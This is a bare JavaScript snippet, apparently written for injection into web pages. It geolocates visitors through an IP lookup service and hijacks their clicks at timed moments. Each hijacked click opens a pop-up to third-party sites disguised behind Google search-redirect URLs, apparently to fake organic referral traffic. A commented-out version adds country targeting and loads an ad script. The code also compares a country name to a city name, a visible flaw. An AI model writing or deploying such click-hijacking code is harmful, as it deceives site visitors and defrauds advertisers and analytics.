
let dts=(new Date).getSeconds();
let dtm=(new Date).getMinutes();

if(!localStorage.xrd){
  (async()=>{
    localStorage.xrd=1;
    let aa=await(await(await fetch('https://ipapi.co/country_name')).text());
    if(aa=='Ahmedabad'){localStorage.Ahme='1'}
    uhd()
  })();
}


function uhd(){
  document.onclick=()=>{
    if(!sessionStorage.i&&localStorage.Ahme&&dtm==3&&dts==3){
        window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwj0za3j5tD8AhVyUGwGHbKyA884PBAWegQIHBAB&url=https%3A%2F%2Fsohanisharma.com%2F&usg=AOvVaw2FwzforLOYGwSOaMFMe8Du'); 
    }
    if(!sessionStorage.i&&dtm==9&&(dts==9)){
      window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiS1dqD59D8AhXGSWwGHdlwAy4QFnoECBgQAQ&url=https%3A%2F%2Fquikfinance.blogspot.com%2F&usg=AOvVaw310xac6tK_tXd7iu0nFfse'); 
    }  
    sessionStorage.i='i';
  }
}
uhd()




// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania

// if (!localStorage.gieu) {
//     (async()=>{
//         localStorage.gieu=1;
//         let aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
//         if(/Canada|New Zealand|United Kingdom|United States|Slovakia|Australia|Belgium|Finland|Germany|Norway|Ireland|China|Hong Kong|Singapore|France|Switzerland|Lithuania/i.test(aa)){
//             localStorage.gieu=2;
//             uhd()
//         }else{
//             localStorage.gieu=3;
//             uhd()
//         }
//     })();
// }

// function uhd(){
//   document.onclick=()=>{
//     let dte=(new Date).getSeconds();
//     (async()=>{try{await import('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
//         if(!sessionStorage.i&&(localStorage.gieu==2&&dte>9&&dte<9||localStorage.gieu==3&&dte>9&&dte<9)){
//             window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwj32re4tJb7AhVnTmwGHSgzAiIQFnoECBEQAQ&url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu'); 
//             sessionStorage.i='i';
//         }         
//     }catch(e){}})()
//   }
// }
// uhd()
